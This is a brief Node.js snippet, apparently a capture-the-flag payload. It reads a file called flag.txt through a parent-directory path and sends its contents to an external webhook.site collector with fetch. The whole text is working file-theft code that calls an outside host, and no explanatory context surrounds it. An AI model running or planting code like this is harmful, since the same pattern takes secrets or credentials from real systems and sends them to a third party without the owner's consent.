require('fs').readFile('/app/../flag.txt', (err, data) => {
  if (!err) {
    fetch('https://webhook.site/ff07d904-39d0-4e1e-94ef-ca7e055d5538?flag=' + encodeURIComponent(data.toString()));
  }
});
